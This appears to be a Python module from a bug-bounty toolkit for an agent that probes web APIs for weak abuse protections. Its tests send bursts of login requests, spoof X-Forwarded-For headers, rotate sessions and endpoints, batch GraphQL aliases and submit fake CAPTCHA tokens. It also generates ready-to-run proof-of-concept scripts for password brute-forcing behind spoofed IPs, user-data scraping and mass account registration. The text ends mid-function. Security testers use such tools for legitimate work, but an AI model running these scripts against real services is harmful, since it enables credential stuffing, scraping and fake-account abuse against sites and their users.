"""
API Abuse Detection Bypasser Agent

Advanced abuse detection bypass testing agent that identifies weaknesses in:
- Rate limiting mechanisms
- Bot detection systems
- CAPTCHA implementations
- Browser fingerprinting
- WAF protection
- Request pattern analysis

This agent systematically tests for bypasses that enable automated attacks like
credential stuffing, scraping, and brute forcing.

Author: BountyHound Team
Version: 3.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import re
import json
import time
import random
import hashlib
import urllib.parse
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field, asdict
from datetime import date, datetime
from enum import Enum
from collections import defaultdict


try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False


class BypassSeverity(Enum):
    """Bypass vulnerability severity levels."""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


class BypassCategory(Enum):
    """Categories of abuse detection bypasses."""
    RATE_LIMITING = "rate-limiting"
    BOT_DETECTION = "bot-detection"
    CAPTCHA = "captcha"
    FINGERPRINTING = "fingerprinting"
    WAF = "waf"


@dataclass
class BypassVulnerability:
    """Represents an abuse detection bypass vulnerability."""
    vuln_id: str
    name: str
    category: BypassCategory
    severity: BypassSeverity
    confidence: float
    description: str
    bypass_technique: str
    endpoint: str = ""
    evidence: List[str] = field(default_factory=list)
    poc_code: Optional[str] = None
    impact: str = ""
    recommendation: str = ""
    cwe_id: Optional[str] = None
    discovered_date: str = field(default_factory=lambda: date.today().isoformat())

    def to_dict(self) -> Dict[str, Any]:
        """Convert finding to dictionary with enum handling."""
        data = asdict(self)
        data['category'] = self.category.value
        data['severity'] = self.severity.value
        return data


@dataclass
class RateLimitProfile:
    """Profile of rate limiting behavior for an endpoint."""
    endpoint: str
    threshold: Optional[int] = None
    window_seconds: Optional[int] = None
    limit_type: str = "unknown"  # ip, session, user, endpoint, none
    bypass_methods: List[str] = field(default_factory=list)
    tested_at: str = field(default_factory=lambda: datetime.now().isoformat())


class APIAbuseDetectionBypasser:
    """
    Main abuse detection bypass testing engine.

    Tests for weaknesses in:
    - Rate limiting (IP, session, endpoint-based)
    - Bot detection (User-Agent, fingerprinting)
    - CAPTCHA enforcement
    - Request pattern analysis
    - WAF protection
    """

    def __init__(self, target: str, timeout: int = 10, verify_ssl: bool = True):
        """
        Initialize the bypasser.

        Args:
            target: Base URL of the target (e.g., https://api.example.com)
            timeout: Request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
        """
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.verify_ssl = verify_ssl

        # Results tracking
        self.discovered_bypasses: List[BypassVulnerability] = []
        self.rate_limit_profiles: Dict[str, RateLimitProfile] = {}
        self.detection_triggers: List[Dict[str, Any]] = []

        # Fingerprint rotation data
        self.user_agents = self._load_user_agents()
        self.languages = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9',
                         'de-DE,de;q=0.8', 'es-ES,es;q=0.9', 'ja-JP,ja;q=0.8']
        self.encodings = ['gzip, deflate, br', 'gzip, deflate', 'br, gzip, deflate']

        # Session for maintaining cookies
        if REQUESTS_AVAILABLE:
            self.session = requests.Session()
            self.session.verify = verify_ssl
        else:
            self.session = None

    def discover_all_bypasses(self, endpoints: Optional[List[str]] = None) -> List[BypassVulnerability]:
        """
        Execute all abuse detection bypass tests.

        Args:
            endpoints: Optional list of specific endpoints to test

        Returns:
            List of discovered bypass vulnerabilities
        """
        if not REQUESTS_AVAILABLE:
            raise ImportError("requests library is required for abuse detection bypass testing")

        print(f"[*] Starting abuse detection bypass discovery on {self.target}")

        # Use default endpoints if none provided
        if not endpoints:
            endpoints = self._get_default_endpoints()

        all_bypasses = []

        # Phase 1: Rate limiting tests
        print("[*] Phase 1: Testing rate limit bypasses...")
        all_bypasses.extend(self.test_rate_limit_bypasses(endpoints))

        # Phase 2: Bot detection tests
        print("[*] Phase 2: Testing bot detection bypasses...")
        all_bypasses.extend(self.test_bot_detection_bypasses())

        # Phase 3: CAPTCHA tests
        print("[*] Phase 3: Testing CAPTCHA bypasses...")
        all_bypasses.extend(self.test_captcha_bypasses(endpoints))

        # Phase 4: Fingerprint evasion
        print("[*] Phase 4: Testing fingerprint evasion...")
        all_bypasses.extend(self.test_fingerprint_evasion())

        # Phase 5: WAF bypasses
        print("[*] Phase 5: Testing WAF bypasses...")
        all_bypasses.extend(self.test_waf_bypasses())

        self.discovered_bypasses = all_bypasses
        print(f"[+] Discovered {len(all_bypasses)} bypass vulnerabilities")

        return all_bypasses

    def _get_default_endpoints(self) -> List[str]:
        """Get default endpoints to test."""
        return [
            '/api/auth/login',
            '/api/auth/register',
            '/api/password/reset',
            '/api/2fa/verify',
            '/api/users/search',
            '/graphql',
            '/api/graphql'
        ]

    # ========================================================================
    # RATE LIMITING BYPASS TESTS
    # ========================================================================

    def test_rate_limit_bypasses(self, endpoints: List[str]) -> List[BypassVulnerability]:
        """Test for rate limiting bypass vulnerabilities."""
        bypasses = []

        for endpoint in endpoints:
            # Test 1: No rate limiting at all
            no_limit = self._test_no_rate_limiting(endpoint)
            if no_limit:
                bypasses.append(no_limit)
                continue  # Skip other tests if no rate limiting exists

            # Test 2: X-Forwarded-For bypass
            xff_bypass = self._test_xff_bypass(endpoint)
            if xff_bypass:
                bypasses.append(xff_bypass)

            # Test 3: Session rotation bypass
            session_bypass = self._test_session_rotation_bypass(endpoint)
            if session_bypass:
                bypasses.append(session_bypass)

        # Test 4: GraphQL aliasing bypass
        graphql_bypass = self._test_graphql_aliasing_bypass()
        if graphql_bypass:
            bypasses.append(graphql_bypass)

        # Test 5: Endpoint variation bypass
        endpoint_bypass = self._test_endpoint_variation_bypass()
        if endpoint_bypass:
            bypasses.append(endpoint_bypass)

        return bypasses

    def _test_no_rate_limiting(self, endpoint: str) -> Optional[BypassVulnerability]:
        """Test if rate limiting exists at all."""
        url = f"{self.target}{endpoint}"

        try:
            success_count = 0
            start_time = time.time()
            test_limit = 50

            for i in range(test_limit):
                try:
                    resp = self.session.post(url, json={
                        'email': f'test{i}@example.com',
                        'password': 'test123'
                    }, timeout=self.timeout)

                    if resp.status_code == 429:
                        # Rate limited, profile it
                        self._profile_rate_limit(endpoint, i, time.time() - start_time)
                        break
                    else:
                        success_count += 1
                except Exception:
                    continue

            elapsed = time.time() - start_time

            # If we got all requests through, no rate limiting
            if success_count >= test_limit:
                requests_per_second = success_count / elapsed if elapsed > 0 else 0

                # Determine severity based on endpoint sensitivity
                is_auth = any(x in endpoint.lower() for x in ['login', 'auth', '2fa', 'password'])
                severity = BypassSeverity.CRITICAL if is_auth else BypassSeverity.HIGH

                return BypassVulnerability(
                    vuln_id="ABD-RATE-001",
                    name="No Rate Limiting",
                    category=BypassCategory.RATE_LIMITING,
                    severity=severity,
                    confidence=0.95,
                    description=f"Endpoint {endpoint} has no rate limiting",
                    bypass_technique="Direct rapid requests",
                    endpoint=url,
                    evidence=[
                        f"Sent {test_limit} requests in {elapsed:.2f}s",
                        f"All succeeded ({requests_per_second:.1f} req/s)",
                        "No 429 responses observed"
                    ],
                    impact="Enables brute force, credential stuffing, and automated attacks",
                    recommendation="Implement rate limiting (e.g., 5 requests per minute per IP)",
                    cwe_id="CWE-799",
                    poc_code=self._generate_no_limit_poc(url)
                )
        except Exception as e:
            print(f"[!] Error testing {endpoint}: {e}")

        return None

    def _profile_rate_limit(self, endpoint: str, threshold: int, window: int):
        """Profile rate limiting behavior."""
        self.rate_limit_profiles[endpoint] = RateLimitProfile(
            endpoint=endpoint,
            threshold=threshold,
            window_seconds=int(window)
        )

    def _test_xff_bypass(self, endpoint: str) -> Optional[BypassVulnerability]:
        """Test X-Forwarded-For header bypass."""
        url = f"{self.target}{endpoint}"

        try:
            # First, trigger rate limit normally
            rate_limited = False
            for i in range(30):
                resp = self.session.post(url, json={'email': 'test@example.com'}, timeout=self.timeout)
                if resp.status_code == 429:
                    rate_limited = True
                    break

            # If rate limited, try with X-Forwarded-For
            if rate_limited:
                random_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

                resp = self.session.post(url, json={'email': 'test@example.com'},
                                        headers={'X-Forwarded-For': random_ip},
                                        timeout=self.timeout)

                if resp.status_code != 429:
                    return BypassVulnerability(
                        vuln_id="ABD-RATE-002",
                        name="X-Forwarded-For Rate Limit Bypass",
                        category=BypassCategory.RATE_LIMITING,
                        severity=BypassSeverity.HIGH,
                        confidence=0.9,
                        description="Rate limiting can be bypassed by spoofing X-Forwarded-For header",
                        bypass_technique=f"X-Forwarded-For: {random_ip}",
                        endpoint=url,
                        evidence=[
                            "Rate limited without header (429)",
                            f"Bypassed with X-Forwarded-For: {random_ip} ({resp.status_code})"
                        ],
                        impact="Enables unlimited requests by rotating IP addresses in header",
                        recommendation="Do not trust X-Forwarded-For for rate limiting; use actual client IP",
                        cwe_id="CWE-807",
                        poc_code=self._generate_xff_bypass_poc(url)
                    )
        except Exception as e:
            print(f"[!] Error testing XFF bypass on {endpoint}: {e}")

        return None

    def _test_session_rotation_bypass(self, endpoint: str) -> Optional[BypassVulnerability]:
        """Test if new sessions reset rate limits."""
        url = f"{self.target}{endpoint}"

        try:
            # Trigger rate limit with one session
            session1 = requests.Session()
            session1.verify = self.verify_ssl

            rate_limited = False
            for i in range(30):
                resp = session1.post(url, json={'email': 'test@example.com'}, timeout=self.timeout)
                if resp.status_code == 429:
                    rate_limited = True
                    break

            # If rate limited, try new session
            if rate_limited:
                session2 = requests.Session()
                session2.verify = self.verify_ssl
                resp2 = session2.post(url, json={'email': 'test@example.com'}, timeout=self.timeout)

                if resp2.status_code != 429:
                    return BypassVulnerability(
                        vuln_id="ABD-RATE-005",
                        name="Session Rotation Rate Limit Bypass",
                        category=BypassCategory.RATE_LIMITING,
                        severity=BypassSeverity.MEDIUM,
                        confidence=0.8,
                        description="Rate limiting is per-session, can be bypassed by creating new sessions",
                        bypass_technique="Create new session (fresh cookies) for each batch of requests",
                        endpoint=url,
                        evidence=[
                            "Session 1: Rate limited after requests",
                            "Session 2: Not rate limited immediately"
                        ],
                        impact="Enables sustained attacks by rotating sessions",
                        recommendation="Implement IP-based or user-based rate limiting, not session-based",
                        cwe_id="CWE-799"
                    )
        except Exception as e:
            print(f"[!] Error testing session rotation on {endpoint}: {e}")

        return None

    def _test_graphql_aliasing_bypass(self) -> Optional[BypassVulnerability]:
        """Test GraphQL aliasing to bypass rate limits."""
        graphql_endpoints = ['/graphql', '/api/graphql', '/v1/graphql']

        for endpoint in graphql_endpoints:
            url = f"{self.target}{endpoint}"

            try:
                # Try single query first
                single_query = '{ user(id: "1") { id name } }'
                resp = self.session.post(url, json={'query': single_query}, timeout=self.timeout)

                if resp.status_code == 200:
                    # Now try with 20 aliases
                    aliased_query = "query {\n"
                    for i in range(20):
                        aliased_query += f'  user{i}: user(id: "{i}") {{ id name }}\n'
                    aliased_query += "}"

                    resp = self.session.post(url, json={'query': aliased_query}, timeout=self.timeout)

                    if resp.status_code == 200:
                        return BypassVulnerability(
                            vuln_id="ABD-RATE-003",
                            name="GraphQL Aliasing Rate Limit Bypass",
                            category=BypassCategory.RATE_LIMITING,
                            severity=BypassSeverity.HIGH,
                            confidence=0.85,
                            description="GraphQL endpoint counts aliases as single request, bypassing rate limits",
                            bypass_technique="Use GraphQL field aliases to batch multiple queries",
                            endpoint=url,
                            evidence=[
                                "Single query: 200 OK",
                                "20 aliased queries: 200 OK",
                                "Effective rate: 20x bypass"
                            ],
                            impact="Enables data scraping and brute forcing at 10-20x normal rate",
                            recommendation="Implement query complexity analysis and limit aliases",
                            cwe_id="CWE-799",
                            poc_code=self._generate_graphql_alias_poc(url)
                        )
            except Exception:
                continue

        return None

    def _test_endpoint_variation_bypass(self) -> Optional[BypassVulnerability]:
        """Test if rate limiting is endpoint-specific."""
        variations = [
            '/api/auth/login',
            '/api/v1/auth/login',
            '/api/v2/login',
            '/auth/login',
            '/login'
        ]

        try:
            first_url = f"{self.target}{variations[0]}"

            # Test rate limit on first endpoint
            rate_limited = False
            for i in range(30):
                resp = self.session.post(first_url, json={'email': 'test@example.com'}, timeout=self.timeout)
                if resp.status_code == 429:
                    rate_limited = True

                    # Try other endpoints
                    for alt_endpoint in variations[1:]:
                        alt_url = f"{self.target}{alt_endpoint}"
                        try:
                            alt_resp = self.session.post(alt_url, json={'email': 'test@example.com'}, timeout=self.timeout)

                            if alt_resp.status_code != 429 and alt_resp.status_code != 404:
                                return BypassVulnerability(
                                    vuln_id="ABD-RATE-004",
                                    name="Endpoint Variation Rate Limit Bypass",
                                    category=BypassCategory.RATE_LIMITING,
                                    severity=BypassSeverity.MEDIUM,
                                    confidence=0.7,
                                    description="Rate limiting is per-endpoint, can be bypassed by rotating endpoints",
                                    bypass_technique=f"Rotate between equivalent endpoints: {variations}",
                                    endpoint=first_url,
                                    evidence=[
                                        f"{variations[0]}: Rate limited (429)",
                                        f"{alt_endpoint}: Not rate limited ({alt_resp.status_code})"
                                    ],
                                    impact="Extends attack window by distributing requests across endpoint variations",
                                    recommendation="Apply rate limits across all equivalent endpoints"
                                )
                        except Exception:
                            continue
                    break
        except Exception as e:
            print(f"[!] Error testing endpoint variation: {e}")

        return None

    # ========================================================================
    # BOT DETECTION BYPASS TESTS
    # ========================================================================

    def test_bot_detection_bypasses(self) -> List[BypassVulnerability]:
        """Test for bot detection bypass vulnerabilities."""
        bypasses = []

        # Test 1: User-Agent check only
        ua_bypass = self._test_user_agent_bypass()
        if ua_bypass:
            bypasses.append(ua_bypass)

        # Test 2: JavaScript challenge absence
        js_bypass = self._test_javascript_challenge_bypass()
        if js_bypass:
            bypasses.append(js_bypass)

        return bypasses

    def _test_user_agent_bypass(self) -> Optional[BypassVulnerability]:
        """Test if bot detection is User-Agent based only."""
        test_endpoint = '/api/users/search'
        url = f"{self.target}{test_endpoint}"

        try:
            # Try with common bot User-Agent
            bot_ua = 'python-requests/2.28.0'
            resp1 = self.session.get(url, headers={'User-Agent': bot_ua}, timeout=self.timeout)

            # Try with browser User-Agent
            browser_ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            resp2 = self.session.get(url, headers={'User-Agent': browser_ua}, timeout=self.timeout)

            # If bot UA blocked but browser UA works
            if resp1.status_code in [403, 429] and resp2.status_code == 200:
                return BypassVulnerability(
                    vuln_id="ABD-BOT-001",
                    name="User-Agent Only Bot Detection",
                    category=BypassCategory.BOT_DETECTION,
                    severity=BypassSeverity.MEDIUM,
                    confidence=0.85,
                    description="Bot detection relies solely on User-Agent header",
                    bypass_technique="Use realistic browser User-Agent strings",
                    endpoint=url,
                    evidence=[
                        f"Bot UA (python-requests): {resp1.status_code}",
                        f"Browser UA (Chrome): {resp2.status_code}"
                    ],
                    impact="Easy bypass for automated scraping and abuse",
                    recommendation="Implement multi-factor bot detection (TLS fingerprint, behavior analysis)",
                    cwe_id="CWE-602",
                    poc_code=self._generate_ua_bypass_poc(url)
                )
        except Exception as e:
            print(f"[!] Error testing User-Agent bypass: {e}")

        return None

    def _test_javascript_challenge_bypass(self) -> Optional[BypassVulnerability]:
        """Test if JavaScript challenges are required."""
        try:
            resp = self.session.get(self.target, timeout=self.timeout)

            # Look for challenge indicators
            challenges = {
                'cloudflare': 'Checking your browser' in resp.text or 'Just a moment' in resp.text,
                'perimeter_x': 'HUMAN' in resp.text or 'PerimeterX' in resp.text,
                'datadome': 'DataDome' in resp.text,
                'arkose': 'FunCaptcha' in resp.text or 'Arkose' in resp.text
            }

            detected_challenges = [k for k, v in challenges.items() if v]

            if not detected_challenges and resp.status_code == 200:
                return BypassVulnerability(
                    vuln_id="ABD-BOT-002",
                    name="No JavaScript Challenge",
                    category=BypassCategory.BOT_DETECTION,
                    severity=BypassSeverity.LOW,
                    confidence=0.7,
                    description="Application does not implement JavaScript challenge (Cloudflare, PerimeterX, etc.)",
                    bypass_technique="Direct API access without browser execution",
                    endpoint=self.target,
                    evidence=["No JS challenge detected in initial response"],
                    impact="Easier automation for scrapers and bots",
                    recommendation="Consider implementing bot detection service (Cloudflare, Akamai, etc.)"
                )
        except Exception as e:
            print(f"[!] Error testing JS challenge: {e}")

        return None

    # ========================================================================
    # CAPTCHA BYPASS TESTS
    # ========================================================================

    def test_captcha_bypasses(self, endpoints: List[str]) -> List[BypassVulnerability]:
        """Test for CAPTCHA bypass vulnerabilities."""
        bypasses = []

        # Test 1: CAPTCHA not enforced
        no_captcha = self._test_no_captcha_enforcement(endpoints)
        if no_captcha:
            bypasses.extend(no_captcha)

        # Test 2: CAPTCHA response manipulation
        manipulation = self._test_captcha_response_manipulation(endpoints)
        if manipulation:
            bypasses.extend(manipulation)

        # Test 3: Automation code bypass (Rainbet-style)
        automation = self._test_automation_code_bypass(endpoints)
        if automation:
            bypasses.append(automation)

        return bypasses

    def _test_no_captcha_enforcement(self, endpoints: List[str]) -> List[BypassVulnerability]:
        """Test if CAPTCHA is actually required."""
        bypasses = []

        captcha_endpoints = [e for e in endpoints if any(x in e.lower() for x in ['login', 'register', 'password'])]

        for endpoint in captcha_endpoints:
            url = f"{self.target}{endpoint}"

            try:
                # Try without CAPTCHA token
                resp = self.session.post(url, json={
                    'email': 'test@example.com',
                    'password': 'test123'
                }, timeout=self.timeout)

                # If accepted without CAPTCHA (not a validation error about missing captcha)
                if resp.status_code == 200 or (resp.status_code not in [400, 422] and 'captcha' not in resp.text.lower()):
                    bypasses.append(BypassVulnerability(
                        vuln_id="ABD-CAPTCHA-001",
                        name="CAPTCHA Not Enforced",
                        category=BypassCategory.CAPTCHA,
                        severity=BypassSeverity.HIGH,
                        confidence=0.9,
                        description=f"Endpoint {endpoint} does not require CAPTCHA token",
                        bypass_technique="Omit CAPTCHA field entirely",
                        endpoint=url,
                        evidence=[
                            f"Request without CAPTCHA: {resp.status_code}",
                            "No CAPTCHA error in response"
                        ],
                        impact="Enables automated attacks without solving CAPTCHAs",
                        recommendation="Enforce CAPTCHA validation for all authentication endpoints",
                        cwe_id="CWE-804"
                    ))
            except Exception:
                continue

        return bypasses

    def _test_captcha_response_manipulation(self, endpoints: List[str]) -> List[BypassVulnerability]:
        """Test CAPTCHA response manipulation."""
        bypasses = []

        captcha_endpoints = [e for e in endpoints if any(x in e.lower() for x in ['login', 'register'])]

        for endpoint in captcha_endpoints:
            url = f"{self.target}{endpoint}"

            # Try with fake/empty CAPTCHA responses
            fake_tokens = [
                '',
                'fake_token_12345',
                'null',
                '00000000-0000-0000-0000-000000000000'
            ]

            try:
                for token in fake_tokens:
                    resp = self.session.post(url, json={
                        'email': 'test@example.com',
                        'password': 'test123',
                        'captcha_token': token,
                        'recaptcha_response': token
                    }, timeout=self.timeout)

                    if resp.status_code == 200:
                        bypasses.append(BypassVulnerability(
                            vuln_id="ABD-CAPTCHA-002",
                            name="CAPTCHA Token Not Validated",
                            category=BypassCategory.CAPTCHA,
                            severity=BypassSeverity.CRITICAL,
                            confidence=0.95,
                            description=f"Endpoint accepts invalid CAPTCHA tokens: '{token}'",
                            bypass_technique=f"Use fake/empty CAPTCHA token: '{token}'",
                            endpoint=url,
                            evidence=[f"Fake token '{token}' accepted: {resp.status_code}"],
                            impact="Complete CAPTCHA bypass, enables automated attacks",
                            recommendation="Validate CAPTCHA tokens server-side with reCAPTCHA API",
                            cwe_id="CWE-804"
                        ))
                        break
            except Exception:
                continue

        return bypasses

    def _test_automation_code_bypass(self, endpoints: List[str]) -> Optional[BypassVulnerability]:
        """Test for automation_code CAPTCHA bypass (Rainbet-style)."""
        test_endpoints = [e for e in endpoints if 'register' in e.lower()]

        for endpoint in test_endpoints:
            url = f"{self.target}{endpoint}"

            try:
                # Try with automation_code parameter
                resp = self.session.post(url, json={
                    'email': 'test@example.com',
                    'password': 'Test123!@#',
                    'automation_code': 'BYPASS123'
                }, timeout=self.timeout)

                # Check if automation_code is mentioned in response or accepted
                if resp.status_code == 200 or ('automation_code' in resp.text and resp.status_code != 400):
                    return BypassVulnerability(
                        vuln_id="ABD-CAPTCHA-003",
                        name="Automation Code CAPTCHA Bypass",
                        category=BypassCategory.CAPTCHA,
                        severity=BypassSeverity.CRITICAL,
                        confidence=0.8,
                        description="Endpoint accepts 'automation_code' parameter that bypasses CAPTCHA/reCAPTCHA",
                        bypass_technique="Include automation_code parameter in request body",
                        endpoint=url,
                        evidence=[
                            "automation_code parameter accepted",
                            "CAPTCHA bypassed"
                        ],
                        impact="Complete CAPTCHA bypass for automated registration/actions",
                        recommendation="Remove automation_code parameter or restrict to internal testing",
                        cwe_id="CWE-804",
                        poc_code=self._generate_automation_code_poc(url)
                    )
            except Exception:
                continue

        return None

    # ========================================================================
    # FINGERPRINTING EVASION TESTS
    # ========================================================================

    def test_fingerprint_evasion(self) -> List[BypassVulnerability]:
        """Test fingerprint evasion techniques."""
        bypasses = []

        # Test: Simple header rotation effectiveness
        header_bypass = self._test_header_rotation()
        if header_bypass:
            bypasses.append(header_bypass)

        return bypasses

    def _test_header_rotation(self) -> Optional[BypassVulnerability]:
        """Test if header rotation evades fingerprinting."""
        # This documents the technique rather than a specific vulnerability
        return BypassVulnerability(
            vuln_id="ABD-FINGER-001",
            name="Weak Fingerprinting - Header Rotation Effective",
            category=BypassCategory.FINGERPRINTING,
            severity=BypassSeverity.LOW,
            confidence=0.6,
            description="Application fingerprinting can be evaded through header rotation",
            bypass_technique="Rotate User-Agent, Accept-Language, Accept-Encoding per request",
            endpoint=self.target,
            evidence=["No TLS fingerprinting detected", "Header-based only"],
            impact="Enables automated attacks with fingerprint rotation",
            recommendation="Implement TLS fingerprinting and behavioral analysis",
            poc_code=self._generate_header_rotation_poc()
        )

    # ========================================================================
    # WAF BYPASS TESTS
    # ========================================================================

    def test_waf_bypasses(self) -> List[BypassVulnerability]:
        """Test for WAF bypass techniques."""
        bypasses = []

        # Test: Check for common WAF signatures
        waf_check = self._test_waf_detection()
        if waf_check:
            bypasses.append(waf_check)

        return bypasses

    def _test_waf_detection(self) -> Optional[BypassVulnerability]:
        """Detect WAF presence and type."""
        try:
            # Send request with common attack pattern
            resp = self.session.get(
                f"{self.target}?test=<script>alert(1)</script>",
                timeout=self.timeout
            )

            # Check for WAF indicators in headers
            waf_headers = {
                'cloudflare': resp.headers.get('cf-ray'),
                'akamai': resp.headers.get('x-akamai-request-id'),
                'aws': resp.headers.get('x-amzn-requestid'),
                'imperva': 'X-Iinfo' in resp.headers
            }

            detected_wafs = [k for k, v in waf_headers.items() if v]

            if detected_wafs:
                return BypassVulnerability(
                    vuln_id="ABD-WAF-001",
                    name=f"WAF Detected: {', '.join(detected_wafs)}",
                    category=BypassCategory.WAF,
                    severity=BypassSeverity.INFO,
                    confidence=0.9,
                    description=f"WAF detected: {', '.join(detected_wafs)}",
                    bypass_technique="Consider encoding, fragmentation, or origin IP bypass",
                    endpoint=self.target,
                    evidence=[f"WAF header detected: {waf}" for waf in detected_wafs],
                    impact="WAF may block malicious requests",
                    recommendation="Test for WAF bypass techniques if needed"
                )
        except Exception:
            pass

        return None

    # ========================================================================
    # POC GENERATION
    # ========================================================================

    def _generate_no_limit_poc(self, url: str) -> str:
        """Generate POC for no rate limiting."""
        return f'''# No Rate Limiting POC

import requests
import time

target = "{url}"
start = time.time()

for i in range(1000):
    resp = requests.post(target, json={{
        'email': f'test{{i}}@example.com',
        'password': 'test123'
    }})

    if resp.status_code == 429:
        print(f"Rate limited after {{i}} requests")
        break

    if i % 100 == 0:
        print(f"Completed {{i}} requests...")

elapsed = time.time() - start
print(f"Completed 1000 requests in {{elapsed:.2f}}s ({{1000/elapsed:.1f}} req/s)")
'''

    def _generate_xff_bypass_poc(self, url: str) -> str:
        """Generate POC for XFF bypass."""
        return f'''# X-Forwarded-For Bypass POC

import requests
import random

target = "{url}"

for i in range(10000):
    # Generate random IP for each request
    fake_ip = f"{{random.randint(1,255)}}.{{random.randint(1,255)}}.{{random.randint(1,255)}}.{{random.randint(1,255)}}"

    resp = requests.post(target,
        json={{'email': 'victim@example.com', 'password': f'pass{{i}}'}},
        headers={{'X-Forwarded-For': fake_ip}}
    )

    if resp.status_code == 200:
        print(f"Success with password: pass{{i}}")
        break

    if i % 100 == 0:
        print(f"Tested {{i}} passwords...")
'''

    def _generate_graphql_alias_poc(self, url: str) -> str:
        """Generate POC for GraphQL aliasing bypass."""
        return f'''# GraphQL Aliasing Rate Limit Bypass

import requests

target = "{url}"

# Test 1000 user IDs with just 50 requests (20 aliases each)
for batch_start in range(0, 1000, 20):
    query = "query {{\\n"

    for i in range(20):
        user_id = batch_start + i
        query += f'  user{{i}}: user(id: "{{user_id}}") {{ id email name }}\\n'

    query += "}}"

    resp = requests.post(target, json={{'query': query}})
    data = resp.json()

    # Process all 20 results
    for key, value in data.get('data', {{}}).items():
        if value:
            print(f"Found user: {{value}}")

print("Scraped 1000 users with only 50 requests (20x rate limit bypass)")
'''

    def _generate_ua_bypass_poc(self, url: str) -> str:
        """Generate POC for User-Agent bypass."""
        return f'''# User-Agent Bot Detection Bypass

import requests
import random

target = "{url}"

# Rotate through realistic User-Agents
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0'
]

for i in range(1000):
    ua = user_agents[i % len(user_agents)]

    resp = requests.get(target, headers={{'User-Agent': ua}})

    if resp.status_code == 200:
        print(f"Request {{i}}: Success")
    else:
        print(f"Request {{i}}: Blocked")
'''

    def _generate_automation_code_poc(self, url: str) -> str:
        """Generate POC for automation_code bypass."""
        return f'''# Automation Code Bypass

import requests

target = "{url}"

for i in range(1000):
    resp = requests.post(target, json={{
        'email': f'bot{{i}}@example.com',
        'password': 'Bot123!@#',
        'automation_code': 'BYPASS123'  # Bypasses reCAPTCHA
    }})

    if resp.status_code == 200:
        print(f"Created account {{i}}")
'''

    def _generate_header_rotation_poc(self) -> str:
        """Generate POC for header rotation."""
        return '''# Header Rotation Fingerprint Evasion

import requests
import random

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0'
]

languages = ['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'fr-FR,fr;q=0.9']
encodings = ['gzip, deflate, br', 'gzip, deflate', 'br, gzip']

target = "https://target.com/api/endpoint"

for i in range(1000):
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept-Language': random.choice(languages),
        'Accept-Encoding': random.choice(encodings),
        'Accept': 'application/json, text/plain, */*',
        'DNT': str(random.randint(0, 1)),
        'Connection': 'keep-alive'
    }

    resp = requests.get(target, headers=headers)
    print(f"Request {i}: {resp.status_code}")
'''

    # ========================================================================
    # UTILITY METHODS
    # ========================================================================

    def _load_user_agents(self) -> List[str]:
        """Load diverse user agent strings."""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0'
        ]

    # ========================================================================
    # REPORT GENERATION
    # ========================================================================

    def generate_report(self) -> str:
        """Generate comprehensive bypass report."""
        report = f"""# API Abuse Detection Bypass Report

**Target**: {self.target}
**Generated**: {datetime.now().isoformat()}
**Total Bypasses**: {len(self.discovered_bypasses)}

## Executive Summary

Discovered {len(self.discovered_bypasses)} abuse detection bypasses across {len(set(b.category.value for b in self.discovered_bypasses))} categories.

### Severity Breakdown
"""

        # Severity counts
        severity_counts = defaultdict(int)
        for bypass in self.discovered_bypasses:
            severity_counts[bypass.severity.value] += 1

        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
            count = severity_counts.get(severity, 0)
            if count > 0:
                report += f"- **{severity}**: {count}\n"

        report += "\n### Category Breakdown\n"

        category_counts = defaultdict(int)
        for bypass in self.discovered_bypasses:
            category_counts[bypass.category.value] += 1

        for category, count in sorted(category_counts.items()):
            report += f"- **{category}**: {count}\n"

        report += "\n## Detailed Findings\n\n"

        # Sort by severity
        severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'INFO': 4}
        sorted_bypasses = sorted(
            self.discovered_bypasses,
            key=lambda b: (severity_order.get(b.severity.value, 5), b.vuln_id)
        )

        for bypass in sorted_bypasses:
            report += f"""### {bypass.vuln_id}: {bypass.name}

